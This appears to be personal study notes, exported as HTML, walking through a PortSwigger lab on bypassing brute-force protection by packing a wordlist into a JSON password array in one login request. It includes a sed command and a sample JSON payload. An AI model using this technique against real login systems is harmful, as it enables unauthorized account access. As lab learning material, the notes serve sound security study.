<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Broken brute-force protection, multiple credentials per request (JSON)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Broken brute-force protection, multiple credentials per request (JSON)</h1><br/><br />Multiple passwords in a single request a JSON format<br /><br />1. Note that the Login Request is inside a JSON<br />    <a href=""><img src="images/2076-1.png" alt="images/2076-1.png" /></a><br />2. <span style="text-decoration:underline;">Burp Repeater</span>: replace the single string value of the password with an array of strings containing all of the candidate passwords.<br />    <a href=""><img src="images/2076-2.png" alt="images/2076-2.png" /></a><br />3. Create the JSON of the passwords with this commands<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">sed</span> -i <span style="color:#3ad900;font-weight:400">&#39;s/.*/&quot;&amp;&quot;,/&#39;</span> pass.txt<span style="color:#ff9d00;font-weight:700">;</span> <span style="color:#ff9d00;font-weight:700">cat</span> pass.txt</pre></div><br />    Then edit it a little bit with:<br />   ◇ Add the “username” that we want to try<br />   ◇ in the password array delete the last comma(,) otherwise it generate an Internal Error<br />       <a href=""><img src="images/2076-3.png" alt="images/2076-3.png" /></a><br />       <a href=""><img src="images/2076-4.png" alt="images/2076-4.png" /></a><br />   The JSON will become something like this:<br />   <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">{</span><br />    <span style="color:#3ad900;font-weight:400">&quot;username&quot;</span><span style="color:#ff9d00;font-weight:700">:</span><span style="color:#3ad900;font-weight:400">&quot;carlos&quot;</span>,<br />    <span style="color:#3ad900;font-weight:400">&quot;password&quot;</span><span style="color:#ff9d00;font-weight:700">:</span>[<br />        <span style="color:#3ad900;font-weight:400">&quot;123456&quot;</span>,<br />        <span style="color:#3ad900;font-weight:400">&quot;password&quot;</span>,<br />        <span style="color:#3ad900;font-weight:400">&quot;......&quot;</span><br />        <span style="color:#3ad900;font-weight:400">&quot;qwerty&quot;</span>,<br />        <span style="color:#3ad900;font-weight:400">&quot;montana&quot;</span>,<br />        <span style="color:#3ad900;font-weight:400">&quot;moon&quot;</span>,<br />        <span style="color:#3ad900;font-weight:400">&quot;moscow&quot;</span><br />    ]<br /><span style="color:#ff9d00;font-weight:700">}</span></pre></div><br /><br />4. If The Website accept the request and the correct password is in the Wordlist we should have something like this to render in the browser<br />    <a href=""><img src="images/2076-5.png" alt="images/2076-5.png" /></a><br />    <a href=""><img src="images/2076-6.png" alt="images/2076-6.png" /></a><br />    Logged in<br /><br /><strong>Bibliography:</strong><br /><a href="https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request">https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request</a><br /></div>
</body>
</html>
